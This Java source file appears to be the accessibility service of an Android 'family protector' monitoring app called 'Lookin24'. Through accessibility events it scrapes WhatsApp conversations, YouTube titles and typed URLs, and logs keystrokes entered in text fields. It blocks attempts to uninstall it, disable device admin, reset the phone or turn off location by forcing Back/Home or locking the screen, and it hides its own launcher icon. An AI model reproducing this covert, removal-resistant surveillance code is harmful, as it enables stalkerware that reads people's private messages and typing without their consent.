package com.family.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;

import com.family.background.GoogleService;
import com.family.familyprotector.ContactHelper;
import com.family.familyprotector.Conversation;
import com.family.familyprotector.Device;
import com.family.familyprotector.FileR;
import com.family.familyprotector.InstallUninstallReceiver;
import com.family.familyprotector.Logger;
import com.family.familyprotector.Message;
import com.family.familyprotector.MyFirebaseMessagingService;
import com.family.familyprotector.Not;
import com.family.familyprotector.ParentActivity;
import com.family.familyprotector.Translator;
import com.family.internet.ServerHelper2;
import com.family.util.ActInfo;
import com.family.util.DoublyLinkedList;
import com.family.util.Pair;
import com.family.util.StringUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.DateFormatSymbols;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;


public class MyAccessibilityService extends AccessibilityService {






    public static MyAccessibilityService instance;
    public static Set<String> blockedApps;
    /*public static boolean writeBlockedApp = true;*/
    public static String lastConversation;
    public static ArrayList<AccessibilityNodeInfo> parentsW = new ArrayList<>();
    public static String imei = null;
    long lastTimeActive = -1;
    public static boolean gpsIcaze = true, silIcaze = false, actionsIcaze = false, inputsIcaze = true;
    public static boolean firstTime = true;
    public static boolean firebaseSended = false;
    public static String lastAction = "";
    //String packagedi birinci element limitdir ikinci istifade olunan
    public static Map<String, Pair> limits = new HashMap<String, Pair>();

    public static void storeSharedPreference(String key, String value) {
        SharedPreferences sp = instance.getSharedPreferences("pref", Context.MODE_PRIVATE);
        SharedPreferences.Editor e = sp.edit();
        e.putString(key, value);
        e.commit();
    }
    public static boolean isFirebaseTokenStored() {
        SharedPreferences sp = instance.getSharedPreferences("pref", Context.MODE_PRIVATE);
        String s = sp.getString("fbt", "");
        if(s.equals("")) return false;
        else {
            MyAccessibilityService.firebaseSended = true;
            return true;
        }
    }


    //every day havo to reneuw
    public static ArrayList< Ac > activities;
    public static ArrayList<YAc> yactivities = new ArrayList<>();
    public static ArrayList<WAc> webSites = new ArrayList<>();
    public static String oldEntry = null;
    public static Map<String, Conversation> conversationMap = new HashMap<>();
    /*public static Conversation simpleConversation = new Conversation();*/
    public static Set<String> Apps = new HashSet<>();

    public class Ac {

        public String pa;
        public long start;
        public long end;
        public ArrayList<ActInfo> l = new ArrayList<>();
    }
    public class YAc {
        public String name = "";
        public long time = 0;
    }
    public class WAc {
        public String url = "";
        public long time = 0;
    }

    ArrayList<AccessibilityNodeInfo> textViewNodes;
    private void findChildViews(AccessibilityNodeInfo parentView) {
        if (parentView == null || parentView.getClassName() == null ) {
            return;
        }
        int childCount = parentView.getChildCount();
        //Log.d("sagol", parentView.getClassName().toString());
        //TextView
        //EditText
        if(parentView.getClassName().toString().contentEquals("android.widget.EditText")) {
            String ans = parentView.getText() != null ? parentView.getText().toString() : "null";
            //Logger.l("INFOO", isWebsite(ans) + "-" + ans);
            if(isWebsite(ans)) {
                if(webSites.size() == 0 || !webSites.get(webSites.size()-1).url.equals(ans)) {
                    Logger.l("INFOOO", ans);
                    WAc w = new WAc();
                    w.time = System.currentTimeMillis();
                    w.url = ans;
                    webSites.add(w);
                }
            }
        }
        if (childCount == 0 && (parentView.getClassName().toString().contentEquals("android.widget.TextView"))) {
            String ans = parentView.getText() != null ? parentView.getText().toString() : "null";
            textViewNodes.add(parentView);
        } else {
            for (int i = 0; i < childCount; i++) {
                findChildViews(parentView.getChild(i));
            }


        }
    }

    /*@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    public void whatsappFilter2(AccessibilityNodeInfo ni) {
        List<AccessibilityNodeInfo> L = ni.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name");
        for(AccessibilityNodeInfo x : L) {
            CharSequence c = x.getText();
            if(c == null){
                continue;
            }
            lastConversation = x.getText().toString();
            break;
        }
        Logger.l("BEGIN=============");
        Set<Integer> simpleSet = new HashSet<>();
        parentsW = new ArrayList<>();
        for(int i = 0; i < textViewNodes.size(); i++) {
            AccessibilityNodeInfo ti = textViewNodes.get(i);
            AccessibilityNodeInfo p = ti.getParent();
            // whatsapi chavlandiranda 2 dene text dalbadal gelir. sonra vaxt;
            //whatsapda yuxarida vaxt informasiyasi olanda parent yazanda 3 mende 4
            //if(pp == null) continue;
            int phc = p.hashCode();
            if(!simpleSet.contains(phc)) {
                parentsW.add(p);
                simpleSet.add(phc);
            }
        }
        Logger.l("Size" + parentsW.size());
        if(parentsW.size() > 0 && parentsW.get(0).getChildCount() == 1) {
            lastConversation = getTextViewText(parentsW.get(0).getChild(0));
        }

    }*/

    /*public static int IgnoreId = -123;*/
    public static Message lastMessage = null;
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    public void whatsappFilter(AccessibilityNodeInfo ni) {
        if(StringUtil.parseVersion(Build.VERSION.RELEASE) >= 5 && false) {
            List<AccessibilityNodeInfo> L = ni.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_name");
            for(AccessibilityNodeInfo x : L) {
                CharSequence c = x.getText();
                if(c == null){
                    continue;
                }
                lastConversation = x.getText().toString();
                break;
                //Logger.l("WHATSAPPP", );

            }
        }


        //List<AccessibilityNodeInfo> entry = ni.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry");
//        if(entry.size() != 0) {
//            //Logger.l("---------------" + getTextViewText(entry.get(0)));
//        }

        Logger.l("BEGIN=============");
        Set<Integer> simpleSet = new HashSet<>();
        parentsW = new ArrayList<>();
        for(int i = 0; i < textViewNodes.size(); i++) {

            AccessibilityNodeInfo ti = textViewNodes.get(i);
            AccessibilityNodeInfo p = ti.getParent();
            // whatsapi chavlandiranda 2 dene text dalbadal gelir. sonra vaxt;
            //whatsapda yuxarida vaxt informasiyasi olanda parent yazanda 3 mende 4
            //if(pp == null) continue;
            if(p == null) {
                return;
            }
            int phc = p.hashCode();

            if(!simpleSet.contains(phc)) {
                parentsW.add(p);
                simpleSet.add(phc);
            }
        }
        Logger.l("Size" + parentsW.size());
        if(parentsW.size() > 0 ) {
            lastConversation = getTextViewText(parentsW.get(0).getChild(0));
            Logger.l("BANGE", lastConversation);
        }
        Conversation cc = conversationMap.get(lastConversation);
        if(cc == null) {
            cc = new Conversation();
            cc.number = new ContactHelper(this).getPhoneNumber(this, lastConversation);
            conversationMap.put(lastConversation, cc);
        }
        ArrayList<Message> messages = new ArrayList<>();

        for(AccessibilityNodeInfo x : parentsW) {
            Logger.l("B=======");
            int c = x.getChildCount();
            Message m = new Message();
            Logger.l("SIZE = " + c);
            if(c == 1) {
                //lastConversation = getTextViewText(x.getChild(0));
            }

            if(c > 0 && StringUtil.onlyUppercase(getTextViewText(x.getChild(0)))) {
                m.date = StringUtil.getDate(getTextViewText(x.getChild(0)));
            }
            if(c == 3 && StringUtil.isTime(getTextViewText(x.getChild(1))) &&
                    x.getChild(2) != null && x.getChild(2).getClassName().toString().endsWith("ImageView")) {
                //vaxti ozun tap
                m.sender = "Men";
                m.content = getTextViewText(x.getChild(0));
                m.unclear = StringUtil.removePM(getTextViewText(x.getChild(1)));
                m.saat = m.unclear;
                if(messages.size() != 0 && messages.get(messages.size()-1).date != null&& m.date != null) {
                    m.date = (Calendar) messages.get(messages.size()-1).date.clone();
                    m.date = StringUtil.setDateTime2(m.date, m.unclear);
                }
            }else if(c == 2 && StringUtil.isTime(getTextViewText(x.getChild(1)))) {
                //vacxti ozun tap
                m.sender = lastConversation;
                m.content = getTextViewText(x.getChild(0));
                m.unclear = StringUtil.removePM(getTextViewText(x.getChild(1)));
                m.saat = m.unclear;
                if(messages.size() != 0 && messages.get(messages.size()-1).date != null && m.date != null) {
                    m.date = (Calendar) messages.get(messages.size()-1).date.clone();
                    m.date = StringUtil.setDateTime2(m.date, m.saat);
                }
            }else if(c == 3 && StringUtil.onlyUppercase(getTextViewText(x.getChild(0))) && StringUtil.isTime(getTextViewText(x.getChild(2)))) {
                m.sender = lastConversation;
                m.date = StringUtil.getDate(getTextViewText(x.getChild(0)));
                m.date = StringUtil.setDateTime2(m.date, getTextViewText(x.getChild(2)));
                m.content = getTextViewText(x.getChild(1));
                m.saat = StringUtil.removePM(getTextViewText(x.getChild(2)));

            }else if(c == 4 && StringUtil.onlyUppercase(getTextViewText(x.getChild(0))) && StringUtil.isTime(getTextViewText(x.getChild(2))) &&
                    x.getChild(x.getChildCount()-1).getClassName().toString().endsWith("ImageView")) {
                m.sender = "Men";
                m.date = StringUtil.getDate(getTextViewText(x.getChild(0)));
                m.date = StringUtil.setDateTime2(m.date, getTextViewText(x.getChild(2)));
                m.content = getTextViewText(x.getChild(1));
                m.saat = StringUtil.removePM(getTextViewText(x.getChild(2)));
            }else if(c == 12|| c == 13) {// time yuxarida cixib apply ele evvelden meluma qeder
//                String t = getTextViewText(x.getChild(6));
//                for(Message me : messages) {
//                    if(me.date == null) {
//
//                        me.date = StringUtil.getDate(t);
//                        if(me.unclear == null){
//                            continue;
//                        }
//                        StringUtil.setDateTime(me.date, me.unclear);
//                        me.saat = me.unclear;
//                        me.unclear = null;
//                    }else {
//                        break;
//                    }
//                }
            }else if(c == 3 && StringUtil.isTime(getTextViewText(x.getChild(2))) && (x.getChild(0).getClassName().toString().
                    endsWith("FrameLayout") || x.getChild(0).getClassName().toString().
                    endsWith("LinearLayout"))){
                m.sender = lastConversation;
                m.content = getTextViewText(x.getChild(1));
                m.unclear = StringUtil.removePM(getTextViewText(x.getChild(2)));
                m.saat = m.unclear;
                if(messages.size() != 0 && messages.get(messages.size()-1).date != null&& m.date != null) {
                    m.date = (Calendar) messages.get(messages.size()-1).date.clone();
                    m.date = StringUtil.setDateTime2(m.date, m.saat);
                }
            }else if(c == 4 && StringUtil.isTime(getTextViewText(x.getChild(2))) && (x.getChild(0).getClassName().toString().
                    endsWith("FrameLayout") || x.getChild(0).getClassName().toString().
                    endsWith("LinearLayout"))){
                m.sender = "Men";
                m.content = getTextViewText(x.getChild(1));
                m.unclear = StringUtil.removePM(getTextViewText(x.getChild(2)));
                m.saat = m.unclear;
                if(messages.size() != 0 && messages.get(messages.size()-1).date != null&& m.date != null) {
                    m.date = (Calendar) messages.get(messages.size()-1).date.clone();
                    m.date = StringUtil.setDateTime2(m.date, m.saat);
                }
            }else if(c == 5 && StringUtil.isTime(getTextViewText(x.getChild(3))) && x.getChild(1).getClassName().toString().
                    endsWith("SeekBar")) {
                m.sender = lastConversation;
                m.content = "Voice " + getTextViewText(x.getChild(2));
                m.unclear = StringUtil.removePM(getTextViewText(x.getChild(3)));
                m.saat = m.unclear;
                if(messages.size() != 0 && messages.get(messages.size()-1).date != null&& m.date != null) {
                    m.date = (Calendar) messages.get(messages.size()-1).date.clone();
                    m.date = StringUtil.setDateTime2(m.date, m.saat);
                }
                if(lastMessage!= null && lastMessage.content.startsWith("Voice") && m.sender.equals(lastMessage.sender)) {
                    m.sender = null;
                }

            }else if(c == 6 && StringUtil.isTime(getTextViewText(x.getChild(4))) && x.getChild(2).getClassName().toString().
                    endsWith("SeekBar")) {
                m.sender = "Men";
                m.content = "Voice " + getTextViewText(x.getChild(3));
                m.unclear = StringUtil.removePM(getTextViewText(x.getChild(4)));
                m.saat = m.unclear;
                if(messages.size() != 0 && messages.get(messages.size()-1).date != null&& m.date != null) {
                    m.date = (Calendar) messages.get(messages.size()-1).date.clone();
                    m.date = StringUtil.setDateTime2(m.date, m.saat);
                }
                if(lastMessage!= null && lastMessage.content.startsWith("Voice") && m.sender.equals(lastMessage.sender)) {
                    m.sender = null;
                }
                Logger.l("VOICEI", x.getChild(4).hashCode() + "");
            }
            else{
                String time = StringUtil.removePM(StringUtil.findTime(x));

                Logger.l("-------------------------------------------------------------"+time + m.date);
                if(time != null) {
                    m.sender = "Whatsapp";
                    m.content = "Media";
                    m.saat = time;
                    m.unclear = time;
                    if(m.date == null) {
                        if(messages.size() != 0 && messages.get(messages.size()-1).date != null) {
                            m.date = (Calendar) messages.get(messages.size()-1).date.clone();
                            m.date = StringUtil.setDateTime2(m.date, time);
                        }
                    }else {
                        m.date = StringUtil.setDateTime2(m.date, time);
                    }

                }else if(c != 0 && StringUtil.onlyUppercase(getTextViewText(x.getChild(0)))) {
                    //burda problem var
                    m.sender = "whatsapp::";
                    m.content = "----";
                    m.saat = "00:00";
                    m.unclear = "00:00";
                    Logger.l("BANGG", "Problem burdadi");
                }
            }
            if(messages.size() == 0 && m.saat != null && cc.M.get(m.toUnique()) != null&& m.date != null) {
                m.date = (Calendar) cc.M.get(m.toUnique()).clone();
                m.date = StringUtil.setDateTime2(m.date, m.saat);
            }
//                    if(m.sender == null) {
//                        continue;
//                    }
            if(m.sender != null)
                messages.add(m);
            for(int i = 0; i < c; i++) {
                AccessibilityNodeInfo child = x.getChild(i);
                if(child == null) continue;
                Logger.l(child.getClassName().toString() + " - " + getTextViewText(child));
            }
            Logger.l("E=======");
        }
        Logger.l("bb---");
        ArrayList<Message> al = new ArrayList<>();
        for(Message x : messages) {
            Logger.l( x.toString());
            if(x.sender != null)
                al.add(x);

        }


        cc.addAll(al);
        Logger.l("SIZE = " + cc.messages.size);
        //cc.messages.iterateForward();
        Logger.l("ee---");
        Logger.l("END=============");
    }
    public static void resizeWhatsapp() {
        ArrayList<String> L = new ArrayList<>();
        long today = new Date().getTime();
        for(Map.Entry<String, Conversation> m : conversationMap.entrySet()) {
            String k = m.getKey();
            Conversation c = m.getValue();
            if(c.messages == null || c.messages.tail == null || c.messages.tail.element.date == null) {
                L.add(k);
                continue;
            }
            for(DoublyLinkedList.Node x = c.messages.head; x != null; x = x.next) {
                Message me = (Message)x.element;
                if(today - me.date.getTimeInMillis() > 1000 * 60 * 60 * 24 * 7) {
                    c.messages.removeFirst();
                    //Logger.l("REMOVED", ((Message)x.element).content);
                }
            }
            if(c.messages.head == null) {
                L.add(k);
            }
        }
        for(String x : L) {
            Logger.l("REMOVED", x);
            conversationMap.remove(x);
        }
    }
    public void youtubeFilter() {
        Logger.l("youtubeler", "BEGIN--------------------");
        for(int i = 1; i < textViewNodes.size(); i++) {
            String ans = getTextViewText(textViewNodes.get(i));
            if(i >= 2 && textViewNodes.get(i).getClassName().toString().endsWith("TextView") &&
                    textViewNodes.get(i-1).getClassName().toString().endsWith("ImageView") &&
                    textViewNodes.get(i-2).getClassName().toString().endsWith("TextView")) {
                String s = getTextViewText(textViewNodes.get(i));
                boolean hasview = false;
                for(String x : Translator.view) {
                    if(s.contains(x)) {
                        hasview = true;
                        break;
                    }
                }
                if(hasview) {
                    String b = getTextViewText(textViewNodes.get(i-2));
                    if(yactivities.size() == 0 || !yactivities.get(yactivities.size()-1).name.equals(b)) {
                        YAc ya = new YAc();
                        ya.name = b;
                        ya.time = System.currentTimeMillis();
                        yactivities.add(ya);
                        Logger.l("BAXIS", b + "   " + ya.time);
                    }
                    return;
                }
            }else if(i >= 4 && textViewNodes.get(i).getClassName().toString().endsWith("TextView") &&
                    textViewNodes.get(i-1).getClassName().toString().endsWith("TextView") &&
                    textViewNodes.get(i-2).getClassName().toString().endsWith("ImageView")&&
                    textViewNodes.get(i-3).getClassName().toString().endsWith("TextView")&&
                    textViewNodes.get(i-4).getClassName().toString().endsWith("FrameLayout")) {
                String s = getTextViewText(textViewNodes.get(i));
                boolean hasview = false;
                for(String x : Translator.view) {
                    if(s.contains(x)) {
                        hasview = true;
                        break;
                    }
                }
                if(hasview) {
                    String b = getTextViewText(textViewNodes.get(i-3));
                    if(yactivities.size() == 0 || !yactivities.get(yactivities.size()-1).name.equals(b)) {
                        YAc ya = new YAc();
                        ya.name = b;
                        ya.time = System.currentTimeMillis();
                        yactivities.add(ya);
                        Logger.l("BAXIS", b + "   " + ya.time);
                    }
                    return;
                }
            }

        }
        /*for(AccessibilityNodeInfo x : textViewNodes) {
            String ans = getTextViewText(x);
            Logger.l("youtubeler", ans+"--" + x.getClassName());
        }*/

        //Logger.l("youtubeler", "END--------------------");
    }

    ArrayList<AccessibilityNodeInfo> textViewNodesSetting;
    private void findChildViewsSettings(AccessibilityNodeInfo parentView) {
        if (parentView == null || parentView.getClassName() == null ) {
            return;
        }
        int childCount = parentView.getChildCount();
        //String ans = parentView.getText() != null ? parentView.getText().toString() : "null";
        //Logger.l("viewSettings", parentView.toString());

        textViewNodesSetting.add(parentView);

        for (int i = 0; i < childCount; i++) {
            findChildViewsSettings(parentView.getChild(i));
        }
    }
    private void findChildViewYoutube(AccessibilityNodeInfo parentView) {
        if (parentView == null || parentView.getClassName() == null ) {
            return;
        }
        int childCount = parentView.getChildCount();
        //String ans = parentView.getText() != null ? parentView.getText().toString() : "null";
        //Logger.l("viewSettings", parentView.toString());
        textViewNodes.add(parentView);

        for (int i = 0; i < childCount; i++) {
            findChildViewYoutube(parentView.getChild(i));
        }
    }
    public void blockSetting(AccessibilityNodeInfo root) {
        String oldText = "";
        //Logger.l("settingler", textViewNodesSetting.size()+"");

        for(int i = 0; i < textViewNodesSetting.size(); i++) {
            AccessibilityNodeInfo mNode = textViewNodesSetting.get(i);
            if(mNode.getText()==null){
                continue;
            }
            String tv1Text = mNode.getText().toString();
            Logger.l("settingler", i + "-" + tv1Text + " --" + Build.VERSION.RELEASE);




            if(!silIcaze &&tv1Text.contains("Lookin24") && i <= 5) {
                sondur();
                sondur();
                Logger.l("SONDUREN", i + "--" + tv1Text);
            }else
            if(!silIcaze &&tv1Text.contains("admin_receiver_status_disable_warning")) {
                sondur();
                sondur();
                Logger.l("SONDUREN", "Admin statusa gore");
            }else if(!silIcaze  && tv1Text.equals("Service Description56")) {
                sondur();
                sondur();
                Logger.l("SONDUREN", "Service Descriptiona gore");
            }else if(!silIcaze && i+1 < textViewNodesSetting.size()&& textViewNodesSetting.get(i+1).getText()!= null&& tv1Text.equals("Lookin24") &&
                    Translator.MS.get("Installed").contains(textViewNodesSetting.get(i+1).getText().toString())) {
                sondur();
                Logger.l("SONDUREN", "Installeda gore");
            }else if(!silIcaze && i-2 >= 0&& textViewNodesSetting.get(i-2).getText()!= null&& tv1Text.equals("Lookin24") && Translator.MS.get("Running app").contains(textViewNodesSetting.get(i-2).getText().toString())) {
                sondur();
                sondur();
                Logger.l("SONDUREN", "Running apa gore");
            }else if(!gpsIcaze && Translator.MS.get("Use location").contains(tv1Text)) {
                sondur();
                sondur();
                Logger.l("SONDUREN", "Use Locationa gore");
            }else if(!silIcaze && i-2 >=0&& textViewNodesSetting.get(i-2).getText()!= null&& tv1Text.equals("Lookin24")
                    && Translator.MS.get("Device admin app").contains(textViewNodesSetting.get(i-2).getText().toString())) {
                sondur();
                sondur();
            }else if(!silIcaze && i-2 >=0&& textViewNodesSetting.get(i-2).getText()!= null&& tv1Text.equals("Lookin24")
                    && Translator.MS.get("Device administrator").contains(textViewNodesSetting.get(i-2).getText().toString())) {
                sondur();
                sondur();
            }else if(!gpsIcaze && i==2&&
                    Translator.MS.get("Location").contains(tv1Text)) {
                sondur();
                sondur();
            }else if(!gpsIcaze &&
                    Translator.MS.get("Location sources").contains(tv1Text)) {
                sondur();
                sondur();
            }else if(!silIcaze &&   tv1Text.endsWith("Lookin24?")) {
                sondur();
                sondur();
            }else if(!silIcaze&& i <= 4) {
                tv1Text = tv1Text.toLowerCase();
                for(String x : Translator.MS.get("reset")) {
                    if(tv1Text.contains(x)) {
                        sondur();
                        sondur();
                        return;
                    }
                }
            }


        }
    }

    public static void disable() {
        try {
            PackageManager p = ParentActivity.that.getPackageManager();
            ComponentName componentName = new ComponentName(ParentActivity.that, ParentActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        }catch (Exception e){}

    }
    public static void enable() {
        PackageManager p = ParentActivity.that.getPackageManager();
        ComponentName componentName = new ComponentName(ParentActivity.that, ParentActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }
    String lastEdit = "QWEREQWERWQ";
    String lastEditPn = "";
    String lastEventText = "ASDAS1D";
    public void blockS(AccessibilityNodeInfo root, AccessibilityEvent event) {
        String oldText = "";
        //Logger.l("settingler", textViewNodesSetting.size()+"");
        //silIcaze = true;

        if(inputsIcaze) {
            try {
                List text = event .getText();
                CharSequence latestText = (CharSequence) text.get(0);
                if(root.getClassName().toString().endsWith("EditText")) {
                    String s = latestText.toString();

                    if(!s.equals(lastEventText)) {
                        if(!StringUtil.isPrefix(lastEdit, s) && StringUtil.dist(lastEdit, s) > 1) {
                            Logger.l("Editlerr", lastEdit+"---------");
                            ActInfo in = new ActInfo();
                            in.pn = lastEditPn;
                            in.t = lastEdit;
                            activities.get(activities.size()-1).l.add(in);
                        }

                        //Logger.l("Editlerr", lastEdit + "-" + s);
                        lastEdit = s;
                        lastEditPn = event.getPackageName().toString();
                        lastEventText = s;
                    }

                }

            }catch (Exception e) {
                e.printStackTrace();
            }
        }
        if(actionsIcaze) {
            try {
                List text = event .getText();
                // dont send every time to server write to file or thing another method
                CharSequence latestText = (CharSequence) text.get(0);
                String act = latestText.toString();

                String ans = System.currentTimeMillis() + "||" + event.getPackageName() + "||" + act;
                if(!act.equals(lastAction)) {
                    Logger.l("Editlerr", ans);
                    FileR.append("actions.txt", ans);
                    lastAction = act;
                }
            }catch (Exception e) {
                e.printStackTrace();
            }
        }

        for(int i = 0; i < textViewNodesSetting.size(); i++) {
            AccessibilityNodeInfo mNode = textViewNodesSetting.get(i);


            if(mNode.getText()==null){
                continue;
            }
            String tv1Text = mNode.getText().toString();
            Logger.l("hamsilar", i + "--" + tv1Text + " - " + mNode.getPackageName());

            if(!silIcaze && tv1Text.equals("Developerde")) {
                sondur();
                Logger.l("SONDURENN", i + "--" + tv1Text + " - " + mNode.getPackageName());
            }else if(!silIcaze &&tv1Text.contains("Lookin24") && i == 0) {

                tamSondur();

                Logger.l("SONDURENN", i + "--" + tv1Text + " - " + mNode.getPackageName());
            }else if(!silIcaze &&tv1Text.contains("Lookin24") && (i == 1||i==2)) {

                sondur();
                Logger.l("SONDURENN", i + "--" + tv1Text + " - " + mNode.getPackageName());
            }else if(!silIcaze &&tv1Text.contains("Lookin24") && tv1Text.length() > 10 && !root.getPackageName().toString().equals("com.android.systemui")){
                sondur();
            } else if(!silIcaze &&tv1Text.equals("Lookin24") && root.getPackageName().toString().contains("permission")){
                sondur();
            }
            else if(!silIcaze &&tv1Text.contains("admin_receiver_status_disable_warning")) {
                sondur();
                sondur();
                Logger.l("SONDUREN", "Admin statusa gore");
            }else if(!silIcaze && (root.getPackageName().toString().equals("com.google.android.packageinstaller") ||
                    (root.getPackageName().toString().equals("com.miui.securitycenter") && tv1Text.equals("Lookin24")))) {
                sondur();
                Logger.l("SONDUREN", "Admin statusa gore");
            }else if(!silIcaze && root.getPackageName().toString().equals("com.miui.securitycore")) {
                sondur();
                sondur();
                Logger.l("SONDUREN", "Admin statusa gore");
            }


        }
    }
    public void blocklocation(AccessibilityNodeInfo root) {
        String oldText = "";
        //Logger.l("settingler", textViewNodesSetting.size()+"");
        for(int i = 0; i < textViewNodesSetting.size(); i++) {
            AccessibilityNodeInfo mNode = textViewNodesSetting.get(i);
            if(mNode.getText()==null){
                continue;
            }
            String tv1Text = mNode.getText().toString();
            //Logger.l("settingler", i + "-" + tv1Text);
            oldText = tv1Text;
            if(!gpsIcaze && tv1Text != null && (Translator.MS.get("Location").contains(tv1Text) || tv1Text.equals("GPS")) && mNode.getPackageName() != null
            && mNode.getPackageName().toString().equals("com.android.systemui")) {
                sondur();
                Logger.l("SONDUREN", "Locationa gore");
            }

        }
    }
    public void blockHuaweo(AccessibilityNodeInfo root) {
        String oldText = "";
        //Logger.l("settingler", textViewNodesSetting.size()+"");
        for(int i = 0; i < textViewNodesSetting.size(); i++) {
            AccessibilityNodeInfo mNode = textViewNodesSetting.get(i);
            if(mNode.getText()==null){
                continue;
            }
            String tv1Text = mNode.getText().toString();
            //Logger.l("settingler", i + "-" + tv1Text);
            oldText = tv1Text;
            if(!silIcaze && tv1Text != null && tv1Text.contains("Lookin24") && tv1Text.length() > 20 && mNode.getPackageName() != null
                    && mNode.getPackageName().toString().equals("com.huawei.android.launcher")) {

                sondur();
                Logger.l("SONDUREN", "Huaweie gore silmekde");
            }

        }
    }
    public void sondur() {
//        if(StringUtil.parseVersion(Build.VERSION.RELEASE) < 11) {
//            disable();
//        }
        for(int i = 0; i < 4; i++) {
            try {
                Thread.sleep(50);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            performGlobalAction(GLOBAL_ACTION_BACK);
            performGlobalAction(GLOBAL_ACTION_HOME);
        }
    }
    public void tamSondur() {
        if(StringUtil.parseVersion(Build.VERSION.RELEASE) < 11) {
            disable();
        }
        performGlobalAction(GLOBAL_ACTION_BACK);
        performGlobalAction(GLOBAL_ACTION_HOME);
        performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);

    }

    public void blockApps(AccessibilityNodeInfo rootNode) {
        if(blockedApps == null) {
            buildBlockedApps();
        }

        if(rootNode.getPackageName() != null && blockedApps.contains(rootNode.getPackageName().toString())) {
            sondur();
        }
    }

    public void activityFilter(AccessibilityNodeInfo rootNode) {
        if(rootNode == null || rootNode.getPackageName() == null) {
            return;
        }
        lastTimeActive = System.currentTimeMillis();
        String pname = rootNode.getPackageName().toString();
        if(activities.size() == 0) {
            Ac ac = new Ac();
            ac.start = System.currentTimeMillis();
            ac.pa = pname;
            ac.end = -1L;
            activities.add(ac);
            Logger.l("AKTIVLIKLER", "Aktivlik elave edildi: " + pname);
        }else if(activities.get(activities.size()-1).end != -1L) {
            //activities.get(activities.size()-1).end = System.currentTimeMillis();
            Ac ac = new Ac();
            ac.start = System.currentTimeMillis();
            ac.pa = pname;
            ac.end = -1L;
            activities.add(ac);
            Logger.l("AKTIVLIKLER", "Aktivlik elave edildi: " + pname);
        }else if(!activities.get(activities.size()-1).pa.equals(pname)) {
            activities.get(activities.size()-1).end = lastTimeActive;
            Ac ac = new Ac();
            ac.start = System.currentTimeMillis();
            ac.pa = pname;
            ac.end = -1L;
            activities.add(ac);
            Logger.l("AKTIVLIKLER", "Aktivlik elave edildi: " + pname);
        }
    }
    public static String lastPackage = "";

    public static boolean isHuawei = Build.MANUFACTURER.toLowerCase().startsWith("huawei");
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

        //silIcaze = true;
        try {

            Logger.l("SILMEK", Build.MANUFACTURER);

            int eventType = accessibilityEvent.getEventType();
            AccessibilityNodeInfo ni = accessibilityEvent.getSource();
            textViewNodesSetting = new ArrayList<>();
            findChildViewsSettings(ni);
            blockS(ni,accessibilityEvent);

            if((System.currentTimeMillis() - lastTimeActive > 15000)) {
                if(activities.size() > 0 && activities.get(activities.size()-1).end == -1 && !activities.get(activities.size()-1).pa.equals(lastPackage)
                        && !lastPackage.equals("")) {
                    if(activities.get(activities.size()-1).pa.equals("com.google.android.youtube")
                            || activities.get(activities.size()-1).pa.equals("com.android.chrome")) {
                        activities.get(activities.size()-1).end = lastTimeActive;
                    }
                    else{
                        activities.get(activities.size()-1).end = System.currentTimeMillis();
                    }
                    Logger.l("AKTIVLIKLER", "Aktivlik baglandi");
                }
            }
            if(isHuawei) {
                textViewNodesSetting = new ArrayList<>();
                findChildViewsSettings(getRootInActiveWindow());
                blockHuaweo(getRootInActiveWindow());
            }


            if(ni == null || ni.getPackageName() == null)return;
            lastPackage = ni.getPackageName().toString();
            //lastTimeActive = System.currentTimeMillis();

            Logger.l("NAMALAR", ni.getPackageName().toString() + "--" + eventType);
            if(!Apps.contains(ni.getPackageName().toString())) {
                Logger.l("ASLAN", ni.getPackageName().toString());
                if(ni.getPackageName() != null && ni.getPackageName().toString().equals("com.android.systemui")) {
                    textViewNodesSetting = new ArrayList<>();
                    AccessibilityNodeInfo r = getRootInActiveWindow();
                    findChildViewsSettings(r);
                    blocklocation(r);
                }
                return;
            }

            String pname = ni.getPackageName().toString();
            if(limits.containsKey(pname)) {
                Pair p = limits.get(pname);
                if(p.second >= p.first) {
                    sondur();
                    sondur();
                }
            }
            switch (eventType) {

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:

                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                    if(rootNode == null)return;
                    activityFilter(rootNode);
                    blockApps(rootNode);

                    textViewNodes = new ArrayList<>();
                    findChildViews(rootNode);

                    if(ni.getPackageName() != null && ni.getPackageName().toString().equals("com.google.android.youtube")) {
                        textViewNodes = new ArrayList<>();
                        findChildViewYoutube(rootNode);
                        youtubeFilter();
                    }else if(ni.getPackageName() != null && (ni.getPackageName().toString().contains("whatsapp")|| ni.getPackageName().toString().equals("com.whatsapp.w4b")) ) {
                        whatsappFilter(ni);
                    }else if(ni.getPackageName() != null && (ni.getPackageName().toString().equals("com.android.settings"))) {
                        blockSetting(ni);
                    }


                    break;

            }
        }catch (Exception e){}

    }


